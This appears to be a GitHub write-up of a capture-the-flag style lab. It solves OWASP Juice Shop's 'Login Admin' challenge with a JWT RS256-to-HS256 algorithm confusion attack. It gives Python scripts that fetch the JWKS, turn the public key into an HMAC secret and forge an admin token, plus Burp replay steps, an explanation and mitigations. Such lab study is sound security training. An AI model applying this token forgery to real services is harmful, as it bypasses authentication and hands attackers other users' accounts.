This is a **comprehensive, OffSec-grade deep dive** into the exploitation process of the **JWT RS256 to HS256 Downgrade Attack** specifically against the **OWASP Juice Shop "Login Admin"** challenge.

---

## 📁 Directory Structure

```
JWT-RS256-to-HS256-Attack-JuiceShop/
├── 01_get_jwks.py           # Downloads and parses the JWKS
├── 02_jwks_to_pem.py        # Converts JWKS to PEM public key
├── 03_forge_token.py        # Crafts HS256 token using RSA public key as HMAC key
├── public.pem               # Output public key used for signing
├── forged_token.txt         # Output token (admin@juice-sh.op)
├── README.md                # Full documentation
```

---

## 🔽 Step 1: Download the JWKS

### 🔧 `01_get_jwks.py`

```python
import requests
import json

url = "http://localhost:3000/.well-known/jwks.json"
response = requests.get(url)
jwks = response.json()

with open("jwks.json", "w") as f:
    json.dump(jwks, f, indent=2)

print("[+] JWKS saved to jwks.json")
```

📌 Output: `jwks.json` file containing modulus (`n`) and exponent (`e`) of the RSA public key.

---

## 🔁 Step 2: Convert JWKS → PEM

### 🔧 `02_jwks_to_pem.py`

```python
import base64
import json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Read JWKS
with open("jwks.json", "r") as f:
    jwks = json.load(f)

key = jwks['keys'][0]

# Decode modulus and exponent
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')

# Build public key object
public_numbers = rsa.RSAPublicNumbers(e, n)
public_key = public_numbers.public_key(default_backend())

# Serialize to PEM
pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("public.pem", "wb") as f:
    f.write(pem)

print("[+] Public key saved to public.pem")
```

📌 Output: `public.pem` → the RSA public key, now usable as an HMAC secret.

---

## 🧪 Step 3: Forge JWT Using HS256

### 🔧 `03_forge_token.py`

```python
import jwt

with open('public.pem', 'rb') as f:
    public_key = f.read()

# JWT payload with escalated privilege
payload = {
    "email": "admin@juice-sh.op"
}

# Create HS256 token signed with public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')

print(f"[+] Forged token:\n{token}")

with open("forged_token.txt", "w") as f:
    f.write(token)
```

📌 Output: `forged_token.txt` → the forged token that grants **admin access**.

---

## 📍 Step 4: Replay via Burp Suite (Manual)

### 🛠️ Steps:

1. Open Burp and go to **Proxy > Intercept**.
2. Intercept a login request using a regular user account.
3. In the HTTP request headers, locate:

   ```
   Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
   ```
4. Replace the JWT value with the contents of `forged_token.txt`.

   ```
   Authorization: Bearer <your_forged_token>
   ```
5. Forward the request.

### 📊 Result:

* You’ll now be authenticated as **[admin@juice-sh.op](mailto:admin@juice-sh.op)**.
* Navigate to `/score-board` to confirm that **“Login Admin” challenge** is marked **SOLVED ✅**.

---

## 🔐 How the Exploit Works – Deep Dive

### 📌 Cryptographic Misuse

* **RS256** = RSA + SHA-256 (asymmetric)
* **HS256** = HMAC + SHA-256 (symmetric)
* If the backend does this:

  ```js
  jwt.verify(token, key)
  ```

  without checking:

  ```js
  if (alg !== 'RS256') reject();
  ```

  then an attacker can:

  * Change the `alg` in JWT header to `"HS256"`
  * Use the RSA **public key** as an **HMAC secret**
  * Generate a valid signature

---

### 🔥 Impact

| Vector               | Description                                   |
| -------------------- | --------------------------------------------- |
| Privilege Escalation | Login as `admin@juice-sh.op` without password |
| Broken AuthN         | Compromises JWT-based session validation      |
| Signature Forgery    | Creates tokens that pass backend verification |

---

## 🛡️ Real-World Mitigations

| Control                          | Purpose                                        |
| -------------------------------- | ---------------------------------------------- |
| 🔒 Enforce algorithm server-side | Don’t allow client to define `alg`             |
| 🔍 Validate library behavior     | Use libraries that hardcode expected algorithm |
| 🚫 Avoid key misuse              | RSA public keys must **never** be used as HMAC |
| 📜 Audit `.well-known/jwks.json` | If exposed, validate access control & intent   |

---

## 🧷 Final Notes

* This method simulates **real-world cryptographic abuse** and is useful in Red Team scenarios where **JWT handling is improperly implemented**.
* The technique is **critical** in penetration testing JWT auth flows.

---

## ✍️ Author

**SHajohn16**
🔗 GitHub: [https://github.com/Shajohn16](https://github.com/Shajohn16)
🎓 OSCP | OSWE (in-progress) | WAPT | Exploit Dev Focused

---
![OWASP JUICE SHOP - LOGIN ADMIN](https://github.com/user-attachments/assets/1d11c39a-c29a-4b9c-9cc3-8d5b8c4ac891)
